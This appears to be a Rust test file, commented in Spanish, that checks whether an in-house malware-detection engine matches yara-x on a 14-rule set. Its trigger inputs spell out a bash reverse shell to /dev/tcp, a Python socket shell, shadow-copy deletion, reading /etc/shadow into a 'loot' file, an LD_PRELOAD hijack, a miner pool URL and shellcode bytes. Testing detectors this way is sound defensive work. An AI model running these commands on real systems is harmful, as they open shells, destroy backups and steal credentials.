//! Paridad con yara-x sobre el conjunto de reglas del agente.
//!
//! La prueba de que el motor propio puede SUSTITUIR a yara-x es que da LAS MISMAS
//! coincidencias sobre las MISMAS entradas. Se compila `base.yar` —las 14 reglas
//! que el agente lleva residentes— con los dos motores y se comparan los conjuntos
//! de reglas que casan, sobre entradas que disparan cada regla y sobre un barrido
//! generativo de bytes aleatorios.
//!
//! yara-x es aqui una dependencia de PRUEBA, no del camino de decision: se usa para
//! demostrar la paridad, no para decidir. Por eso su fila desaparece del arbol de
//! produccion del agente.

use std::collections::BTreeSet;

use aegis_patron::Motor;

/// El conjunto de reglas del agente, empotrado tambien aqui para compararlo.
const BASE: &str = include_str!("../../aegis-scan/rules/base.yar");

/// Las reglas que casan en un buffer, segun el motor propio.
fn propio(motor: &Motor, datos: &[u8]) -> BTreeSet<String> {
    motor
        .escanear(datos)
        .detecciones
        .into_iter()
        .map(|d| d.regla)
        .collect()
}

/// Las reglas que casan en un buffer, segun yara-x.
fn yarax(rules: &yara_x::Rules, datos: &[u8]) -> BTreeSet<String> {
    let mut scanner = yara_x::Scanner::new(rules);
    scanner
        .scan(datos)
        .expect("escaneo yara-x")
        .matching_rules()
        .map(|r| r.identifier().to_string())
        .collect()
}

fn compilar_yarax(fuente: &str) -> yara_x::Rules {
    let mut c = yara_x::Compiler::new();
    c.add_source(fuente).expect("yara-x compila base.yar");
    assert!(c.errors().is_empty(), "yara-x: {:?}", c.errors());
    c.build()
}

#[test]
fn el_conjunto_base_compila_con_las_catorce_reglas() {
    let motor = Motor::compilar(BASE, "base").expect("aegis-patron compila base.yar");
    assert_eq!(motor.reglas(), 14, "el conjunto base tiene 14 reglas");
}

#[test]
fn coincide_con_yarax_sobre_entradas_que_disparan_cada_regla() {
    let motor = Motor::compilar(BASE, "base").unwrap();
    let rules = compilar_yarax(BASE);

    // Entradas construidas para disparar reglas concretas, y algunas limpias.
    let entradas: Vec<Vec<u8>> = vec![
        b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*".to_vec(),
        b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1".to_vec(),
        b"import socket; s=socket.socket(); s.connect((h,p)); dup2(s.fileno(),0); /bin/sh".to_vec(),
        b"All your files are encrypted. To recover your files pay in bitcoin via tor browser onion"
            .to_vec(),
        b"vssadmin delete shadows /all /quiet".to_vec(),
        b"echo x > /etc/ld.so.preload; LD_PRELOAD=/tmp/e.so; dlsym(0,0)".to_vec(),
        b"cat /etc/shadow /etc/passwd /etc/sudoers > loot".to_vec(),
        b"UPX!....UPX0....UPX1".to_vec(),
        b"powershell -enc SQBFAFgA".to_vec(),
        b"stratum+tcp://pool.minexmr.com:4444 xmrig randomx".to_vec(),
        b"un texto completamente inocente sin nada sospechoso dentro".to_vec(),
        vec![0u8; 512],
        // Shellcode hex del stager: 48 bb 2f 62 69 6e 2f 2f 73 68
        vec![
            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x90, 0x90,
        ],
    ];

    for (i, e) in entradas.iter().enumerate() {
        let a = propio(&motor, e);
        let b = yarax(&rules, e);
        assert_eq!(
            a, b,
            "divergencia en la entrada #{i}: propio={a:?} yara-x={b:?}"
        );
    }
}

#[test]
fn coincide_con_yarax_en_un_barrido_generativo() {
    // Barrido diferencial: bytes pseudoaleatorios acotados. Cada divergencia seria
    // un fallo a investigar y explicar; aqui se exige paridad exacta.
    let motor = Motor::compilar(BASE, "base").unwrap();
    let rules = compilar_yarax(BASE);

    let mut x = 0x9E37_79B9_7F4A_7C15u64;
    let mut divergencias = 0;
    for _ in 0..200 {
        let n = 256 + (x as usize % 4096);
        let mut datos = Vec::with_capacity(n);
        for _ in 0..n {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            datos.push(x as u8);
        }
        // Se insertan a veces fragmentos de cadenas conocidas para provocar
        // coincidencias parciales y forzar la evaluacion de condiciones.
        if x & 1 == 0 {
            datos.extend_from_slice(b"/dev/tcp/");
        }
        if x & 2 == 0 {
            datos.extend_from_slice(b"memfd_create/proc/self/fd/execveat");
        }
        let a = propio(&motor, &datos);
        let b = yarax(&rules, &datos);
        if a != b {
            divergencias += 1;
            eprintln!("divergencia: propio={a:?} yara-x={b:?}");
        }
    }
    assert_eq!(
        divergencias, 0,
        "el barrido generativo encontro divergencias"
    );
}
